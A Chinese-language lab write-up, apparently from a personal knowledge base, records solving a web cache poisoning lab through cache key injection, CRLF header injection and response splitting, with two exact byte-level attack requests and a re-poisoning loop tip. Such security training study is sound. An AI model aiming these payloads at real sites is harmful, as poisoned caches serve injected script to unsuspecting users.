---
title: lab-web-cache-poisoning-cache-key-injection
links:
- target: cache-poisoning-family
  relation: evidences
---

# lab-web-cache-poisoning-cache-key-injection

> evidences: [[cache-poisoning-family]]

- 题面:组合多个独立缺陷在受害者 Chrome 里 `alert(1)`;必须用 `Pragma: x-get-cache-key`。 - 判定:**solved**(横幅 `Congratulations, you solved the lab!`;实例 `0a9800fb…`)。无 exploit server,交付由"受害者定期访问首页"自动完成。

## 键代数(实测)

`key = <request-target> + "$$" + (Origin 头存在 ? "Origin=<值>" : "")`

- **头名大小写原样进键**:发 `origin:` 小写 → 键是 `$$origin=…`;发 `Origin:` → `$$Origin=…`。受害者脚本 URL 内带的是**小写** `origin=` ⇒ 投毒必须用小写头(大写永不命中)。 - `utm_content=<v>&` 这一对被键正则剥掉(只删到下一个 `&`)⇒ 让后端处理额外参数而键不变。 - `Vary: origin`;TTL `max-age=35`。

## 两个独立缺陷

1. **反射面**:`/login/?lang=` 把 query 反射进单引号 canonical 但全实体转义(单独不可利用);`/login?lang=<x>`(无尾斜杠)是可缓存 302/400 且把**未解码** query 原样写进 `Location` ⇒ 把注入 lang 交给 `/login/` 渲染的跳板。 2. **CRLF 头注入**:`/js/localize.js?…&cors=1` 把 `Origin` 原样反射进 `Access-Control-Allow-Origin`;`%0d%0a` **被解码后落进响应头** ⇒ 注入 `Content-Length: 8` + 空行 + `alert(1)` 体(响应拆分)。

## 收口(两条字节级请求)

```` # 1) 投毒 localize.js(小写 origin!) GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/1.1 origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$ 键 /js/localize.js?lang=en?cors=1&x=1$$origin=x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$,体=alert(1)
# 2) 用 URL 里的 $$origin= 段伪造受害者 /login?lang=en 的键(本请求不带 Origin 头) GET /login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/1.1 键 /login?lang=en$$,Location 带注入 lang ⇒ 受害者加载 /login/?lang=<注入> ⇒ <script src='/js/localize.js?lang=en?utm_content=x&cors=1&x=1$$origin=…$$#&cors=0'> `#` 截断尾缀 ⇒ 该 URL 的键 = 第 1 步的键 ⇒ 命中投毒响应。 ```
## 判读纪律
- 先 `Pragma: x-get-cache-key` 读键再设计;`http_dump`/`raw_http` 均保留头名大小写(ureq 未规范化)。 - TTL 短:两条请求各跑一个 `poison_loop`(间隔 8s)续毒,直到受害者命中。 - 排障信号:键若显示 `Origin=`(大写)就永远不会命中受害者。
## 来源
- 两条请求形取自第三方 writeup 并逐字复现成功:siunam321 CTF-Writeups `Portswigger-Labs/Web-Cache-Poisoning/Cache-12`(2023-01,含 CRLF 头注入与 `$$origin=` 伪造键的推导)、1392081456/ctf-notes `web/portswigger_web_cache_poisoning_series.md`。 - **本轮唯一卡点**是这些 writeup 未明写的一处:键里 Origin 头名**大小写原样保留**,而受害者脚本 URL 内是小写 `origin=`,故投毒头必须小写 —— 该条为自测补齐。 - 官方题页 solution details 块未读。
## 相关族
- [[cache-poisoning-family]];CRLF/头反射见 [[host-header-family]]。
````
